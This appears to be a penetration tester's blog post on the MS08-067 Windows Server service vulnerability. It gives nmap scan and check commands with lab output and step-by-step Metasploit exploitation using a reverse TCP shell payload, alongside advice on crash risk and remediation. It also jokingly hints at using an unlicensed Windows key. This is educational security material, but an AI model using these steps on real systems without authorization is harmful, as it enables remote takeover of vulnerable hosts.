# MS08-067 aka "Service Service Vulnerability" aka "Push Button Receive Bacon"

On October 23rd, 2008 Microsoft released a Security Bulletin about a new vulnerability affecting the server service that could allow for Remote Code Execution. Remote code execution is a severe vulnerability, as it allows you to run your own code on the target, and often provides local administrator privileges as a result. On any penetration test, achieving total ownership of a host provides the initial foothold to gaining Domain Administrator access over the network.

> This infographic from [Rapid7](https://community.rapid7.com/community/infosec/blog/2014/02/03/new-ms08-067) explains the naming convention on a Microsoft security bulletin. Check out the link for a brief intoduction to the official windows regular patch release known as 'Patch-Tuesday'.

This is one of the most well known vulnerabilities within the security community, due to its ease of exploitation and prevalence across multiple versions of windows operating systems (from windows 2000 to Windows 7 Pre-Beta). It is often the first exploit a new penetration tester learns when attacking a windows machine. Once exploited, it provides the highest level of privaleges on a local system, known as `NT AUTHORITY\SYSTEM`. 

## Exploitation

MS08_067 is a known vulnerability for the [following versions of windows](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250):

* Microsoft Windows 2000 SP4
* XP SP2 and SP3
* Server 2003 SP1 and SP2
* Vista Gold and SP1
* Windows Server 2008
* Windows 7 Pre-Beta

MS08-067 is actually quite a potentially damaging exploit to run, as it has a high chance of crashing the target system. The nmap script `smb-vuln-ms08-067.nse` states:

> *"On a fairly wide scan conducted by Brandon Enright, we determined that on average, a vulnerable system is more likely to crash than to survive the check. Out of 82 vulnerable systems, 52 crashed. Please consider this before running the script."*

This is good to know when discussing the potential risks regarding exploitation with the client, and provides some context on how dangerous this check is when performed against a large number of systems. Some other points to consider when discussing exploitation with the client may be:

* Are they aware that this system exists on their network?
* Is it currently maintained (but not upgraded) as part of overall operations? 
* Is this system part of critical operations? 
* Could this system crashing potentially impact other related system operations? 
* If there is a risk of critical data being lost from the host crashing?

These are important questions to discuss prior to explotation to prevent any adverse impact to business operations. It is important to remember that legacy systems are often maintained for critical operations where specialist software is required. As a result, remediatation may not be as straightforward as simply upgrading the operating system, and alternative approaches should be discussed with the client to ensure that remediation is tailored to them specifically.

### Nmap

To identify a host on the network vulnerable to MS08_067, the first step would be to identify operating system running on each system that also have TCP port 445 open. For this example, i'll be using the IP addresses assigned within my penetration testing lab running off of my laptop.

The nmap scan listed below can identify the operating systems with port 445 open:

```
nmap 192.168.143.1/24 -O -p445
```

Which should provide you with output similar to this for each host that is discovered with these requirements:

```
Starting Nmap 7.25BETA2 ( Https://nmap.org ) at 2017-02-27 17:42 AEDT
Nmap scan report for 192.168.143.138
Hhost is up (0.00093s latency).
PORT	STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:07:C2:21 (VMware)
Warning: OSScan resutls may be unreliable because we could not find atleast 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows XP
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3
OS details: Microsoft Windows XP SP2 or SP3
Network Distance: 1 hop
```

Once you have some specific targets, you could do an initial verification using the nmap script.

```
nmap 192.168.143.138 -p445 --script=smb-vuln-ms08-067.nse
```
Which will display the following output for hosts that are vulnerable to MS08-067.

```
Starting Nmap 7.25BETA2 ( Https://nmap.org ) at 2017-02-27 17:49 AEDT
Nmap scan report for 192.168.143.138
Hhost is up (0.00038s latency).
PORT	STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:07:C2:21 (VMware)

Host script results:
| smb-vuln-ms08-067:
| VULNERABLE:
| Microsoft Windows system vulnerable to remote code execution (MS08-067)
|   State: VULNERABLE
|   IDs:  CVE:CVE-2008-4250
|		  The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
| 		  Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|		  code via a crafted RPC request that triggers the overflow during path canonicalization. 
|
|	Disclosure date: 2008-20-23
|	References:
|	   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_	   https://technet.microsoft.com/en-us/library/securiy/ms08-067.aspx
```

### Metasploit

The `ms08_067_netapi` module is a well known and stable exploit that comes with the [Metasploit framework](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi). Not all exploit modules have a [check command](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/), as it will only apply to exploits where the ability to perform checks (without actually exploiting it) are written into the module. This function ishandy to confirm if the target meets the requirements for exploitation. Luckily, the `ms08_067_netapi` does come with the check command avaliable!

From your Nmap scanning, you should have the IP of your target host, and have an initial confiration that the host is vulnerable.

**Prepare the exploit**

1. Start metasploit using the `msfconsole` command
2. Load the exploit module `use exploit/windows/smb/ms08_067_netapi`
3. Type `info` to learn more about the exploit
4. Enter `options` to list the options required for exploitation
5. Set your target machine `set RHOST 192.168.143.138`

**Prepare your payload**

1. You can use the `show payloads` command to list the compatible payloads for your choosen exploit.
2. In this example, we will use the reverse meterpreter tcp shell, enter `set PAYLOAD windows/shell/reverse_tcp`
3. Enter `options` to list the options for both the configured exploit and payload.
3. Now configure the payload to target to your machine's IP, this will allow us to establish the reverse shell connection `set LHOST 192.168.0.1` 
4. Configure the listening port, by default this is port 4444 `set the LPORT 4444`

> A meterpreter payload provides a shell with additional tools and features that make navigating, escalating privaleges, gaining and cracking password hashes on a host much easier. It is worth playing around with a meterpreter shell and a standard reverse tcp shell (i.e. set payload windows/shell/reverse_tcp) to learn the differences between the two.

**Execute**
1. You can run the `check`command prior to exploitation
2. Or execute via the `run` command

If the exploit completes successfully, you should have a connection to the machine.

One problem is that to practice exploiting MS08_067, you will need to purchase a copy of the windows operating system running one of the vulnerable versions. I mean if you were to download a windows XP installation image, happened to find a licence key and install it? Well i`m just not sure if that is a viable solution to your problem. But you know, with these things its generally about [The Implication](https://www.youtube.com/watch?v=MZ1lc6KASWg).

## Is it really that bad?

If MS08-067 was a child, it would be over 8 years years old by now. It is so easy to exploit and provides such privaleged access to a host, that you would think it would be extremely rare to discover in businesses today. I am dissapointed to write that I am still extremely discovering MS08-067 on my penetration tests to date. Yes, thats right, i'm dissaponted. You might be thinking *"But why are you complaining - that makes your job SO easy!"* and I would agree on face value, that yes it does make my job easy. Waltz in, exploit like a bawse, write an easy report and swagger on my way - *because you just pwned them.*

If clients are struggling with MS08-067 in 2017, its safe to say that if I come back in a years time, it will still be there. There is very little challenge in that, as it is boring to exploit the same or similar vulnerabilities that are just too easy. You don't get outside of your confort zone and learn something new - instead you get complacent and stagnate. Seeking challenges in security is a part of the learning process, and a good penetration tester should crave this.

From the point of view of the client, if MS08-067 exists within the environment, it maybe be:

* Likely that there is data that is 8 years old being stored insecurely
* The host is legacy (old) and vulnerable
* The host is unstable and prone to crashing, and
* The host (may) still be used for day to day operations or;
* The host is used for critical operations, and replacement is difficult and costly.

If you have the relationship with a client to return regularly to perform testing on their systems, and you find the same or similar issues time and time again, you do have to consider - *am I part of the problem?* I have reviewed deliverables done by other testers and companies and more often than not, it is lacking in detail. Security is hard, but it is our job as professionals to guide the client and make it as easy as possible. Spell out remediation, provide multiple options to address the root cause of the issue. If it is too hard, and if the client can't connect the risk of this issue back to the business, it is unlikely that they will remediate it.

### References

Here are the refernces i've linked throughout my post, happy reading.

*MS08-067 aka "Service Service Vulnerability" aka "Push Button Receive Bacon"*

1. https://community.rapid7.com/community/infosec/blog/2014/02/03/new-ms08-067
2. http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

*Exploitation*

1. http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

*Nmap*

1. https://www.grc.com/port_445.htm

*Metasploit*

1. https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
2. https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
3. https://www.youtube.com/watch?v=MZ1lc6KASWg









